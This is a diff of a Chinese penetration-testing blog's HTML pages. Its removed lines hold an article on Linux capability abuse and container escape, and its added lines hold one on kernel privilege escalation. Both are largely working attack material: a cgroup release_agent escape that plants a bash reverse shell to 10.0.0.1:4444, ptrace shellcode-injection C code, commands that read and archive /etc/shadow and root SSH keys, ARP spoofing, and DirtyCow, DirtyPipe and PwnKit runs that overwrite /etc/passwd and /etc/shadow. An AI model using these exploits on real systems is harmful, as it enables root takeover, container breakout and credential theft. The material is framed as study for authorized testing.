+      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1654,156 +886,351 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux Capabilities 将 root 超级权限拆分为细粒度能力单元，本意是实现最小权限原则。但在实际渗透中，错误配置的 Capabilities 和容器环境往往成为提权的捷径。本文系统梳理基于 Capabilities 的本地提权手法，以及 Docker 环境下的四种经典容器逃逸路径。</p>
-<blockquote>
-<p><strong>免责声明</strong>：本文所述技术仅供安全研究与授权测试使用。未经授权对他人系统进行测试属于违法行为，作者不承担任何法律责任。</p>
-</blockquote>
-<h2 id="一、Capabilities-基础"><a href="#一、Capabilities-基础" class="headerlink" title="一、Capabilities 基础"></a>一、Capabilities 基础</h2><p>Linux 将传统 root 权限划分为 40 余种独立能力，关键概念：</p>
-<table>
+          <p>Linux Capabilities 与容器逃逸提权——特权能力利用、Docker 特权模式与 docker.sock 挂载逃逸。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/Linux-privesc-capabilities-docker/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/SQL-injection-stacked-queries/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/SQL-injection-stacked-queries/" class="post-title-link" itemprop="url">SQL 注入：堆叠查询注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-10-15 08:00:00" itemprop="dateCreated datePublished" datetime="2024-10-15T08:00:00+08:00">2024-10-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>SQL 注入：堆叠查询注入——渗透测试实战笔记，含完整攻击链路与防御方案。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/SQL-injection-stacked-queries/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Linux-privesc-kernel/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/Linux-privesc-kernel/" class="post-title-link" itemprop="url">Linux提权：内核漏洞利用</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-10-01 08:00:00" itemprop="dateCreated datePublished" datetime="2024-10-01T08:00:00+08:00">2024-10-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在Linux渗透测试中，拿到低权限shell后的首要目标就是提升至root。内核漏洞利用是最具技术含量的提权路径之一。本文梳理了Linux内核提权的核心技术栈：从信息收集到CVE映射、从经典漏洞复现到exploit搜索与编译、以及内核模块攻击等，附完整代码示例与操作细节。</p>
+<hr>
+<h2 id="一、信息收集：uname-a-与内核版本"><a href="#一、信息收集：uname-a-与内核版本" class="headerlink" title="一、信息收集：uname -a 与内核版本"></a>一、信息收集：uname -a 与内核版本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># Linux target 4.15.0-142-generic #146-Ubuntu SMP ... x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -r          <span class="comment"># 4.15.0-142-generic</span></span><br><span class="line"><span class="built_in">cat</span> /proc/version</span><br><span class="line"><span class="built_in">cat</span> /etc/os-release</span><br></pre></td></tr></table></figure>
+
+<p>版本号解析（以 <code>4.15.0-142-generic</code> 为例）：</p>
+<ul>
+<li>4 — 主版本号 &#x2F; 15 — 次版本号 &#x2F; 0 — 补丁级别</li>
+<li>142 — 发行版补丁号 &#x2F; generic — 内核变体（generic&#x2F;server&#x2F;aws&#x2F;kvm）</li>
+</ul>
+<h2 id="description-Linux-内核漏洞提权——内核版本-CVE-映射、DirtyCow-DirtyPipe-PwnKit-等经典漏洞利用。"><a href="#description-Linux-内核漏洞提权——内核版本-CVE-映射、DirtyCow-DirtyPipe-PwnKit-等经典漏洞利用。" class="headerlink" title="description: Linux 内核漏洞提权——内核版本 CVE 映射、DirtyCow&#x2F;DirtyPipe&#x2F;PwnKit 等经典漏洞利用。"></a>description: Linux 内核漏洞提权——内核版本 CVE 映射、DirtyCow&#x2F;DirtyPipe&#x2F;PwnKit 等经典漏洞利用。</h2><h2 id="二、内核版本与CVE速查映射表"><a href="#二、内核版本与CVE速查映射表" class="headerlink" title="二、内核版本与CVE速查映射表"></a>二、内核版本与CVE速查映射表</h2><table>
 <thead>
 <tr>
-<th>概念</th>
-<th>说明</th>
+<th>内核版本范围</th>
+<th>可利用CVE</th>
+<th>类型</th>
+<th>难度</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>Permitted Set</td>
-<td>进程允许使用的能力集合</td>
+<td>2.6.22 - 3.9</td>
+<td>CVE-2013-2094 (perf_swevent)</td>
+<td>任意写</td>
+<td>低</td>
 </tr>
 <tr>
-<td>Effective Set</td>
-<td>当前实际生效的能力（内核检查此集合）</td>
+<td>2.6.31 - 3.13</td>
+<td>CVE-2014-0038 (recvmmsg)</td>
+<td>内存越界</td>
+<td>低</td>
 </tr>
 <tr>
-<td>Bounding Set</td>
-<td>进程所能拥有的能力上限</td>
+<td>2.6.37 - 3.8.9</td>
+<td>CVE-2012-0056 (mempodipper)</td>
+<td>权限绕过</td>
+<td>极低</td>
 </tr>
 <tr>
-<td>Ambient Set</td>
-<td>非特权程序 execve 后仍能保留的能力（Linux 4.3+）</td>
-</tr>
-</tbody></table>
-<p>文件可通过 <code>setcap</code> 附加能力，存储在扩展属性中：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line">/usr/bin/python3.8 cap_setuid+ep</span><br><span class="line">/usr/bin/ping cap_net_raw+ep</span><br></pre></td></tr></table></figure>
-
-<h2 id="二、getcap-枚举"><a href="#二、getcap-枚举" class="headerlink" title="二、getcap 枚举"></a>二、getcap 枚举</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 递归搜索所有具备文件 Capabilities 的可执行文件</span></span><br><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 筛选高危 Capabilities</span></span><br><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null | grep -E <span class="string">&#x27;cap_sys_admin|cap_sys_ptrace|cap_dac_read_search|cap_setuid|cap_net_raw|cap_sys_module&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查进程 Capabilities</span></span><br><span class="line"><span class="built_in">cat</span> /proc/self/status | grep Cap</span><br><span class="line">capsh --<span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动化工具</span></span><br><span class="line">linpeas.sh  <span class="comment"># https://github.com/peass-ng/PEASS-ng</span></span><br><span class="line">linux-exploit-suggester-2 --capabilities</span><br></pre></td></tr></table></figure>
-
-<p>高危 Capabilities 速查：</p>
-<table>
-<thead>
-<tr>
-<th>Capability</th>
-<th>风险</th>
-<th>提权路径</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>cap_sys_admin</td>
-<td>严重</td>
-<td>挂载、namespace 操作</td>
-</tr>
-<tr>
-<td>cap_sys_ptrace</td>
-<td>严重</td>
-<td>注入任意进程内存</td>
-</tr>
-<tr>
-<td>cap_dac_read_search</td>
-<td>高</td>
-<td>绕过权限读取任意文件</td>
-</tr>
-<tr>
-<td>cap_setuid</td>
-<td>严重</td>
-<td>直接 setuid(0)</td>
-</tr>
-<tr>
-<td>cap_sys_module</td>
-<td>严重</td>
-<td>加载任意内核模块</td>
-</tr>
-<tr>
-<td>cap_net_raw</td>
+<td>3.13 - 4.8.3</td>
+<td>CVE-2016-5195 (DirtyCow)</td>
+<td>条件竞争</td>
 <td>中</td>
-<td>原始套接字、网络嗅探</td>
+</tr>
+<tr>
+<td>3.14 - 4.15</td>
+<td>CVE-2017-1000112 (UFO)</td>
+<td>堆溢出</td>
+<td>中</td>
+</tr>
+<tr>
+<td>4.4 - 4.14</td>
+<td>CVE-2017-16995 (eBPF验证器)</td>
+<td>验证器缺陷</td>
+<td>中</td>
+</tr>
+<tr>
+<td>2.6.0 - 5.8</td>
+<td>CVE-2021-4034 (PwnKit)</td>
+<td>越界写</td>
+<td>极低</td>
+</tr>
+<tr>
+<td>5.8 - 5.16.11</td>
+<td>CVE-2022-0847 (DirtyPipe)</td>
+<td>flags未清理</td>
+<td>极低</td>
+</tr>
+<tr>
+<td>5.11 - 6.2</td>
+<td>CVE-2023-0386 (OverlayFS)</td>
+<td>权限绕过</td>
+<td>低</td>
 </tr>
 </tbody></table>
-<h2 id="三、Capabilities-提权实战"><a href="#三、Capabilities-提权实战" class="headerlink" title="三、Capabilities 提权实战"></a>三、Capabilities 提权实战</h2><h3 id="3-1-cap-sys-admin"><a href="#3-1-cap-sys-admin" class="headerlink" title="3.1 cap_sys_admin"></a>3.1 cap_sys_admin</h3><p>最危险的 Capability 之一，涵盖挂载、namespace 操作等数十个子功能。</p>
-<p><strong>cgroup release_agent 提权</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp</span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp/cgrp/x</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /tmp/cgrp/x/notify_on_release</span><br><span class="line">host_path=$(sed -n <span class="string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab)</span><br><span class="line"><span class="comment"># 写入 payload 到容器可访问路径（宿主机视角）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/sh&#x27;</span> &gt; /release_payload</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&#x27;</span> &gt;&gt; /release_payload</span><br><span class="line"><span class="built_in">chmod</span> +x /release_payload</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$host_path</span>/release_payload&quot;</span> &gt; /tmp/cgrp/release_agent</span><br><span class="line">sh -c <span class="string">&quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</span></span><br></pre></td></tr></table></figure>
+<p>在线资源：<a target="_blank" rel="noopener" href="https://www.linuxkernelcves.com/">Linux Kernel CVEs</a>、<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">Exploit-DB</a>、<a target="_blank" rel="noopener" href="https://nvd.nist.gov/">NVD</a>。</p>
+<hr>
+<h2 id="三、DirtyCow：CVE-2016-5195"><a href="#三、DirtyCow：CVE-2016-5195" class="headerlink" title="三、DirtyCow：CVE-2016-5195"></a>三、DirtyCow：CVE-2016-5195</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>DirtyCow是内核内存管理子系统中潜伏9年的条件竞争漏洞。内核的写时复制（COW）机制处理私有只读映射时存在竞态窗口——攻击者可在COW写入前替换目标页，绕过只读限制向任意文件写入。</p>
+<ul>
+<li><strong>影响范围</strong>: 2.6.22 (2007) 至 4.8.3 (2016)</li>
+<li><strong>利用效果</strong>: 任意文件覆写（&#x2F;etc&#x2F;passwd、&#x2F;etc&#x2F;shadow、SUID二进制等）</li>
+</ul>
+<h3 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a>核心原理</h3><p><code>mm/gup.c</code> 中 <code>__get_user_pages()</code> 处理 <code>FOLL_FORCE</code> 标志时强制获取COW后的写权限，但未正确校验页面只读属性。攻击线程用 <code>madvise(MADV_DONTNEED)</code> 释放目标页缓存，同时写入线程向目标写入数据。两个操作交错执行时COW检查被绕过，写入直接作用于原始只读内存页并同步到磁盘。</p>
+<h3 id="Exploit使用"><a href="#Exploit使用" class="headerlink" title="Exploit使用"></a>Exploit使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirtyc0w.c -o dirtyc0w</span><br><span class="line"><span class="comment"># 覆写 /etc/passwd 添加root用户</span></span><br><span class="line">./dirtyc0w /etc/passwd <span class="string">&quot;<span class="subst">$(echo &#x27;r00t:advwtv/xX,0:0:root:/root:/bin/bash&#x27;)</span>&quot;</span></span><br><span class="line"><span class="comment"># 覆写 /etc/sudoers 免密配置</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;username ALL=(ALL) NOPASSWD: ALL&#x27;</span> | ./dirtyc0w /etc/sudoers -</span><br></pre></td></tr></table></figure>
 
-<p><strong>挂载宿主机磁盘</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 容器内利用 cap_sys_admin 挂载宿主机根分区</span></span><br><span class="line">fdisk -l</span><br><span class="line">mount /dev/sda1 /mnt/host</span><br><span class="line"><span class="built_in">chroot</span> /mnt/host /bin/bash</span><br></pre></td></tr></table></figure>
+<p>注意事项：RHEL&#x2F;CentOS可能后向补丁免疫；exploit可能需要多次尝试；写入内容不能超过文件原有长度；部分内核加固可能使PoC失效。</p>
+<hr>
+<h2 id="四、DirtyPipe：CVE-2022-0847"><a href="#四、DirtyPipe：CVE-2022-0847" class="headerlink" title="四、DirtyPipe：CVE-2022-0847"></a>四、DirtyPipe：CVE-2022-0847</h2><h3 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>DirtyPipe由Max Kellermann在2022年发现，因效果类似DirtyCow而得名”脏管”。漏洞允许无写权限的用户向任意只读文件写入数据，影响范围涵盖服务器、Android、容器等。</p>
+<ul>
+<li><strong>影响范围</strong>: 5.8 至 5.16.11 &#x2F; 5.15.25 &#x2F; 5.10.102 之前</li>
+<li><strong>利用效果</strong>: 任意只读文件覆写</li>
+</ul>
+<h3 id="核心原理-1"><a href="#核心原理-1" class="headerlink" title="核心原理"></a>核心原理</h3><p>管道缓冲区 <code>pipe_buffer.flags</code> 中的 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志控制新数据能否追加到现有页末尾。<code>splice()</code> 将文件数据转移到管道时不会清除该标志——前一次管道操作设置的标志会被错误继承。随后 <code>write()</code> 向管道写入的数据会合并到文件页面缓存中，从而在无写权限的情况下修改磁盘文件。</p>
+<h3 id="Exploit使用-1"><a href="#Exploit使用-1" class="headerlink" title="Exploit使用"></a>Exploit使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://haxx.in/files/dirtypipez.c &amp;&amp; gcc dirtypipez.c -o dirtypipez</span><br><span class="line">./dirtypipez /etc/passwd 1 <span class="string">&quot;evil::0:0::/root:/bin/bash&quot;</span>    <span class="comment"># 覆写passwd</span></span><br><span class="line">./dirtypipez /etc/shadow 1 <span class="string">&quot;root::19090:0:99999:7:::&quot;</span>      <span class="comment"># 清空root密码</span></span><br><span class="line">./dirtypipez /host/etc/passwd 1 <span class="string">&quot;attacker::0:0::/root:/bin/bash&quot;</span>  <span class="comment"># 容器逃逸</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="3-2-cap-sys-ptrace"><a href="#3-2-cap-sys-ptrace" class="headerlink" title="3.2 cap_sys_ptrace"></a>3.2 cap_sys_ptrace</h3><p>允许 ptrace 调试任意进程，可直接注入代码到 root 进程：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译 ptrace 注入工具</span></span><br><span class="line"><span class="built_in">cat</span> &gt; ptrace_inject.c &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    pid_t target = atoi(argv[1]);</span><br><span class="line">    char shellcode[] = <span class="string">&quot;\x48\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f&quot;</span></span><br><span class="line">                       <span class="string">&quot;\x73\x68\x00\x53\x48\x89\xe7\x48\x31\xf6&quot;</span></span><br><span class="line">                       <span class="string">&quot;\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05&quot;</span>;</span><br><span class="line">    struct user_regs_struct regs, saved;</span><br><span class="line">    unsigned long sc_addr;</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_ATTACH, target, NULL, NULL);</span><br><span class="line">    <span class="built_in">wait</span>(NULL);</span><br><span class="line">    ptrace(PTRACE_GETREGS, target, NULL, &amp;regs);</span><br><span class="line">    memcpy(&amp;saved, &amp;regs, sizeof(regs));</span><br><span class="line"></span><br><span class="line">    sc_addr = regs.rsp - 1024;</span><br><span class="line">    <span class="keyword">for</span> (int i = 0; i &lt; sizeof(shellcode); i += 8)</span><br><span class="line">        ptrace(PTRACE_POKEDATA, target, sc_addr + i,</span><br><span class="line">               *(unsigned long *)(shellcode + i));</span><br><span class="line"></span><br><span class="line">    regs.rip = sc_addr;</span><br><span class="line">    ptrace(PTRACE_SETREGS, target, NULL, &amp;regs);</span><br><span class="line">    ptrace(PTRACE_DETACH, target, NULL, NULL);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o ptrace_inject ptrace_inject.c</span><br><span class="line">./ptrace_inject $(pgrep -f <span class="string">&quot;sshd&quot;</span> | <span class="built_in">head</span> -1)</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="五、PwnKit：CVE-2021-4034"><a href="#五、PwnKit：CVE-2021-4034" class="headerlink" title="五、PwnKit：CVE-2021-4034"></a>五、PwnKit：CVE-2021-4034</h2><h3 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>PwnKit是polkit的pkexec组件中潜伏12年的提权漏洞，由Qualys于2021年底披露。pkexec是SUID-root二进制文件，几乎所有安装了polkit的Linux发行版默认存在。</p>
+<ul>
+<li><strong>影响范围</strong>: pkexec自2009年首次commit以来的所有版本</li>
+<li><strong>利用效果</strong>: 任何本地用户立即可获root权限</li>
+</ul>
+<h3 id="核心原理-2"><a href="#核心原理-2" class="headerlink" title="核心原理"></a>核心原理</h3><p>当argc为0调用pkexec时，程序越界访问 <code>argv[0]</code> 和 <code>argv[1]</code>，实际读取的值由环境变量在内存中的排布决定。通过精心构造环境变量，<code>argv[1]</code> 可指向攻击者控制的路径，最终让pkexec以root权限加载恶意共享库执行任意代码。</p>
+<h3 id="Exploit使用-2"><a href="#Exploit使用-2" class="headerlink" title="Exploit使用"></a>Exploit使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /usr/bin/pkexec                          <span class="comment"># 确认SUID: -rwsr-xr-x</span></span><br><span class="line">wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c</span><br><span class="line">gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry</span><br><span class="line">./PwnKit                                        <span class="comment"># id → uid=0(root)</span></span><br><span class="line"><span class="built_in">chmod</span> 0755 /usr/bin/pkexec                      <span class="comment"># 临时防御：移除SUID</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="3-3-cap-dac-read-search"><a href="#3-3-cap-dac-read-search" class="headerlink" title="3.3 cap_dac_read_search"></a>3.3 cap_dac_read_search</h3><p>绕过所有文件读取权限检查，直接读取敏感文件：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python 读取 shadow</span></span><br><span class="line">python3 -c <span class="string">&quot;</span></span><br><span class="line"><span class="string">with open(&#x27;/etc/shadow&#x27;, &#x27;r&#x27;) as f:</span></span><br><span class="line"><span class="string">    print(f.read())</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="comment"># 读取 root SSH 私钥</span></span><br><span class="line">python3 -c <span class="string">&quot;print(open(&#x27;/root/.ssh/id_rsa&#x27;).read())&quot;</span></span><br><span class="line"><span class="comment"># 打包敏感文件</span></span><br><span class="line">tar -cvf /tmp/stolen.tar /etc/shadow /root/.ssh/</span><br></pre></td></tr></table></figure>
+<p>攻击路径：<code>低权限用户 → 特殊环境变量 → pkexec(SUID) → 越界访问 → 加载恶意.so → root shell</code></p>
+<hr>
+<h2 id="六、searchsploit-搜索内核Exploit"><a href="#六、searchsploit-搜索内核Exploit" class="headerlink" title="六、searchsploit 搜索内核Exploit"></a>六、searchsploit 搜索内核Exploit</h2><p><code>searchsploit</code> 是Exploit-DB的离线搜索工具，Kali默认安装，适用于无法联网的环境。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -u                              <span class="comment"># 更新数据库</span></span><br><span class="line">searchsploit linux kernel 4.15 --colour      <span class="comment"># 按版本搜索</span></span><br><span class="line">searchsploit --cve 2022-0847                 <span class="comment"># 按CVE搜索</span></span><br><span class="line">searchsploit -m 40611                        <span class="comment"># 复制到当前目录</span></span><br><span class="line">searchsploit -x 40611                        <span class="comment"># 终端查看</span></span><br><span class="line"><span class="comment"># 基于uname自动搜索</span></span><br><span class="line"><span class="built_in">uname</span> -r | xargs -I &#123;&#125; searchsploit <span class="string">&quot;linux kernel &#123;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="3-4-cap-net-raw"><a href="#3-4-cap-net-raw" class="headerlink" title="3.4 cap_net_raw"></a>3.4 cap_net_raw</h3><p>允许创建原始套接字，用于网络嗅探和中间人攻击：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 -w /tmp/capture.pcap</span><br><span class="line">tcpdump -i eth0 -A | grep -iE <span class="string">&quot;password|token|auth&quot;</span></span><br><span class="line">arpspoof -i eth0 -t 192.168.1.1 192.168.1.100</span><br></pre></td></tr></table></figure>
+<p>结合Metasploit：<code>msfconsole</code> → <code>search linux/local/kernel</code> → <code>use exploit/linux/local/cve_2022_0847_dirtypipe</code>。</p>
+<hr>
+<h2 id="七、在目标主机上编译Exploit"><a href="#七、在目标主机上编译Exploit" class="headerlink" title="七、在目标主机上编译Exploit"></a>七、在目标主机上编译Exploit</h2><p>生产环境通常没有开发工具链，编译exploit需多种策略。</p>
+<h3 id="常见问题与方案"><a href="#常见问题与方案" class="headerlink" title="常见问题与方案"></a>常见问题与方案</h3><p><strong>问题1：gcc不存在</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -static exploit.c -o exploit_static -lpthread   <span class="comment"># 方案A: 本地静态编译（推荐）</span></span><br><span class="line"><span class="built_in">which</span> tcc &amp;&amp; tcc exploit.c -o exploit                <span class="comment"># 方案B: TinyCC轻量编译器</span></span><br></pre></td></tr></table></figure>
 
